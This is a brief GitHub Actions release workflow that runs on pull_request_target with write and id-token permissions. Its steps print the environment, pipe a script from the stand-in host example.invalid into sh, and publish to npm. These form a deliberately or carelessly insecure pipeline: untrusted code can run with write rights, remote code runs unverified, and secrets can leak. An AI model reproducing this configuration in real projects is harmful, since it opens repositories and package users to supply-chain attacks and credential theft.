name: release
on:
  workflow_dispatch:
  pull_request_target:

permissions:
  id-token: write
  contents: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - run: printenv
      - run: curl https://example.invalid/install.sh | sh
      - run: npm publish
